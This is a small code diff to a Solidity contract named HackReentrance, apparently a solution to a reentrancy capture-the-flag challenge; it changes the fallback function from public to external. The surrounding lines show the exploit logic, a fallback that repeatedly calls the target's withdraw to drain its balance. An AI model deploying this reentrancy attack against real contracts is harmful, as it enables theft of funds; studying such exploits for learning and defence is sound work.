@@ -18,7 +18,7 @@ contract HackReentrance {
     reentranceAddress.donate.value(msg.value)(address(this));
   }
 
-  fallback() public payable {
+  fallback() external payable {
     if(address(reentranceAddress).balance != 0){
       reentranceAddress.withdraw(msg.value);
     }
